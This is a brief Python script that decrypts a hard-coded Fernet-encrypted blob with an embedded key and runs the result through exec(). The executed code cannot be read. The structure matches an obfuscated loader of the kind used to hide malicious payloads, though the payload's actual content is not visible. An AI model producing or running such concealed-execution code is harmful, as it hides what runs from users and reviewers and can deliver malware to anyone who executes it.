from cryptography.fernet import Fernet

key = b'2YO2wd6yZXxSKOldJVESjc79nugyGSLwmvob9e0XuLw='
encrypted_code = b'gAAAAABlrVN9aef1FSxoXy3JGKPBHgHC7DPPYWQYQYS4q_0rYP1BBylWqOMewZbVuBVKxat8tBbQhSpsoX1WpFs9iirg7I_3KXKQnv3oiC_fW12OMqzhqLncWnm_j76M8HiIIyIm29lT'

def main():
    encryption_type = Fernet(key)
    decrypted_code = encryption_type.decrypt(encrypted_code)
    exec(decrypted_code)

main()